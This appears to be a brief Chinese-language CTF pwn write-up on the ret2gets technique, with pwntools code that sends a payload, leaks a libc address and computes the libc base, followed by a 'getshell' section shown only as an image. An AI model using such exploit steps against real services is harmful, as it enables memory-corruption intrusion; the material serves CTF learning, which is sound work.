# 考点
ret2gets

# debug
```
io.sendlineafter("your name: \n", payload)

io.sendline(b"a" * 8 + p64(0))
pause()
io.sendline("bbbb")

io.recvuntil("`aa")
leak = u64(io.recv(6).ljust(8, b"\x00"))
log.success("leak :-----> " + hex(leak))
libc.address = leak + 0x28c0
```

![](https://r2.20161023.xyz/pic/20250921194929680.png)



# getshell
![](https://r2.20161023.xyz/pic/20250921195102622.png)